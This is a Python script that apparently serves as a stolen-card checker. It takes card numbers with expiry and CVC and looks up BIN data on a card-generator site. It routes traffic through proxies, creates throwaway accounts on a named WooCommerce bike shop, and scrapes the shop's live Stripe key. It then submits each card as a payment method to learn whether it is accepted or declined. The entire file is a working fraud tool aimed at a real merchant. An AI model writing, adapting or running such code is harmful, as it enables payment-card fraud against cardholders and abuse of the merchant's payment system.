import hashlib
import json
import os
import re
import requests
import random
import string
import uuid
from datetime import datetime

# ========================================
# CONFIGURATION
# ========================================
BASE_URL = "https://www.wulibike.com"
CARD_COUNTRY = "BD"

# ========================================
# PAYMENT METHOD ADDER CLASS
# ========================================
class PaymentMethodAdder:
    """Handles the complete flow of registration and adding payment methods"""
    
    def __init__(self, base_url, proxy=None):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        if proxy:
            self.session.proxies = format_proxy(proxy)
        self.stripe_key = None
        self.email = None
        self.password = None
    
    def generate_random_account(self):
        """Generate random email and password for registration"""
        rand_id = str(uuid.uuid4())[:8]
        self.email = f"user_{rand_id}@testmail.com"
        chars = string.ascii_letters + string.digits + "!@#$"
        self.password = ''.join(random.choice(chars) for _ in range(12)) + "1aA!"
        print(f"🎲 Generated random account: {self.email}")
        return self.email, self.password

    def get_registration_nonces(self):
        """Visit home page to extract required nonces for registration"""
        print("🔄 Extracting registration nonces...")
        try:
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            }
            response = self.session.get(f'{self.base_url}/', headers=headers, timeout=15)
            
            # Extract r_ajax_nonce
            r_ajax_nonce = None
            match_ajax = re.search(r'"r_ajax_nonce":"([a-f0-9]+)"', response.text)
            if match_ajax:
                r_ajax_nonce = match_ajax.group(1)
            
            # Extract woocommerce-register-nonce
            register_nonce = None
            match_reg = re.search(r'id="woocommerce-register-nonce"\s+name="woocommerce-register-nonce"\s+value="([a-f0-9]+)"', response.text)
            if match_reg:
                register_nonce = match_reg.group(1)
            
            if r_ajax_nonce and register_nonce:
                print(f"✅ Nonces extracted: AJAX={r_ajax_nonce}, Register={register_nonce}")
                return r_ajax_nonce, register_nonce
            
            print(f"❌ Failed to extract nonces. AJAX: {r_ajax_nonce}, Register: {register_nonce}")
            return None, None
        except Exception as e:
            print(f"❌ Error getting nonces: {e}")
            return None, None

    def register(self, r_ajax_nonce, register_nonce):
        """Register a new account using the provided nonces"""
        if not self.email or not self.password:
            self.generate_random_account()
            
        print(f"🔄 Registering new account: {self.email}...")
        
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': self.base_url,
            'referer': f'{self.base_url}/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest'
        }
        
        params = {'reycore-ajax': 'account_forms'}
        
        data = {
            '_nonce': r_ajax_nonce,
            'reycore-ajax-data[action_type]': 'register',
            'email': self.email,
            'password': self.password,
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': f'{self.base_url}/',
            'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'wc_order_attribution_session_pages': '1',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': headers['user-agent'],
            'woocommerce-register-nonce': register_nonce,
            '_wp_http_referer': '/',
            'register': 'Register'
        }
        
        try:
            response = self.session.post(f'{self.base_url}/', params=params, headers=headers, data=data, timeout=15)
            if response.status_code == 200:
                print("✅ Registration successful!")
                return True
            print(f"❌ Registration failed: {response.status_code}")
            return False
        except Exception as e:
            print(f"❌ Error during registration: {e}")
            return False

    def extract_stripe_key_and_ajax_nonce(self):
        """Extract Stripe key and AJAX nonce from payment pages"""
        print("🔄 Extracting Stripe key and AJAX nonce...")
        try:
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            }
            response = self.session.get(f'{self.base_url}/my-account/add-payment-method/', headers=headers, timeout=15)
            
            if response.status_code == 200:
                self.stripe_key = None
                ajax_nonce = None
                
                match_key = re.search(r'"key"\s*:\s*"(pk_live_[a-zA-Z0-9]+)"', response.text)
                if not match_key:
                    match_key = re.search(r'"key"\s*:\s*"(pk_test_[a-zA-Z0-9]+)"', response.text)
                
                if match_key:
                    self.stripe_key = match_key.group(1)
                
                match_ajax = re.search(r'"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"', response.text)
                if match_ajax:
                    ajax_nonce = match_ajax.group(1)
                
                if self.stripe_key and ajax_nonce:
                    print(f"✅ Extracted: Stripe Key={self.stripe_key[:20]}..., AJAX Nonce={ajax_nonce}")
                    return self.stripe_key, ajax_nonce
            
            print(f"❌ Failed to extract payment details. Status: {response.status_code}")
            return None, None
        except Exception as e:
            print(f"❌ Error extracting payment data: {e}")
            return None, None

    def create_stripe_payment_method(self, card_data):
        """Create a payment method using Stripe API"""
        print("🔄 Creating Stripe payment method...")
        if not self.stripe_key:
            return None
        
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Google Chrome";v="144", "Not?A_Brand";v="8", "Chromium";v="144"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
        }
        
        card_number = card_data.get('number', '').replace(' ', '+')
        data = f"type=card&card[number]={card_number}&card[cvc]={card_data.get('cvc', '')}&card[exp_year]={card_data.get('exp_year', '')}&card[exp_month]={card_data.get('exp_month', '')}&allow_redisplay=unspecified&billing_details[address][country]={card_data.get('country', 'BD')}&pasted_fields=number&payment_user_agent=stripe.js%2F3c838978ab%3B+stripe-js-v3%2F3c838978ab%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.wulibike.com&time_on_page=23051&key={self.stripe_key}&_stripe_version=2024-06-20"
        
        try:
            response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=15)
            if response.status_code == 200:
                pm_id = response.json().get('id')
                print(f"✅ PM Created: {pm_id}")
                return pm_id
            print(f"❌ Stripe Error: {response.text}")
            return None
        except Exception as e:
            print(f"❌ Error creating PM: {e}")
            return None

    def add_payment_method_to_account(self, payment_method_id, ajax_nonce):
        """Add the payment method to account via AJAX"""
        print("🔄 Finalizing payment method addition...")
        headers = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': self.base_url,
            'referer': f'{self.base_url}/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }
        
        try:
            response = self.session.post(f'{self.base_url}/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=15)
            if response.status_code == 200:
                result = response.json()
                if result.get('success'):
                    print("✅ Card added successfully!")
                    return True, result.get('data', {}).get('id'), "Payment method added successfully"
                error_msg = result.get('data', {}).get('error', {}).get('message', 'Unknown error')
                return False, None, error_msg
            return False, None, f"Status {response.status_code}"
        except Exception as e:
            return False, None, str(e)

    def run(self, card_data):
        """Main execution flow"""
        print("=" * 60)
        print("🚀 Starting Serverless Payment Method Addition")
        print("=" * 60)
        
        self.generate_random_account()
        r_ajax_nonce, reg_nonce = self.get_registration_nonces()
        
        if not r_ajax_nonce or not reg_nonce:
            return None, None, False, "Failed to extract nonces"
            
        if not self.register(r_ajax_nonce, reg_nonce):
            return None, None, False, "Registration failed"
            
        stripe_key, ajax_nonce = self.extract_stripe_key_and_ajax_nonce()
        if not stripe_key or not ajax_nonce:
            return None, None, False, "Failed to extract payment tokens"
            
        pm_id = self.create_stripe_payment_method(card_data)
        if not pm_id:
            return None, None, False, "Failed to create Stripe PM"
            
        success, si_id, message = self.add_payment_method_to_account(pm_id, ajax_nonce)
        return pm_id, si_id, success, message

# ========================================
# HELPER FUNCTIONS
# ========================================

def luhn_check(card_number):
    total = 0
    num_digits = len(card_number)
    oddeven = num_digits & 1
    for i in range(0, num_digits):
        digit = int(card_number[i])
        if not ((i & 1) ^ oddeven):
            digit = digit * 2
        if digit > 9:
            digit = digit - 9
        total = total + digit
    return (total % 10) == 0

def get_bin_info(card_number):
    try:
        bin_num = card_number[:6]
        response = requests.get(f'https://cc-gen-lime.vercel.app/bin/{bin_num}', timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                'issuer': data.get('bank', 'N/A'),
                'brand': data.get('scheme', 'N/A'),
                'country': data.get('country', 'N/A'),
                'level': data.get('tier', 'N/A'),
                'type': data.get('type', 'N/A')
            }
        return None
    except:
        return None

def parse_card(auth_string):
    try:
        parts = auth_string.split('|')
        if len(parts) != 4: return None
        num = parts[0].strip()
        mon = parts[1].strip().zfill(2)
        year = parts[2].strip()
        cvc = parts[3].strip()
        if len(year) == 4: year = year[-2:]
        return {'number': num, 'exp_month': mon, 'exp_year': year, 'cvc': cvc, 'country': CARD_COUNTRY}
    except: return None

def format_proxy(proxy_str):
    if not proxy_str: return None
    try:
        parts = proxy_str.split(':')
        if len(parts) == 4:
            url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            return {"http": url, "https": url}
        return None
    except: return None

# ========================================
# ENDPOINT HANDLER
# ========================================
def handle_endpoint(auth, proxy=None):
    if not auth:
        return {'success': False, 'message': 'Missing auth parameter'}, 400
    
    card_data = parse_card(auth)
    if not card_data:
        return {'success': False, 'message': 'Invalid card format'}, 400
    
    bin_info = get_bin_info(card_data['number'])
    
    if not luhn_check(card_data['number']):
        result = {
            'status': 'error',
            'message': 'Luhn validation failed',
            'card': auth,
            'bin_info': bin_info
        }
        return result, 200

    adder = PaymentMethodAdder(BASE_URL, proxy=proxy)
    pm_id, si_id, success, message = adder.run(card_data)
    
    result = {
        'status': 'success' if success else 'declined',
        'message': message,
        'card': auth,
        'bin_info': bin_info,
        'pm_id': pm_id,
        'si_id': si_id,
        'account': adder.email if success else None
    }
    
    return result, 200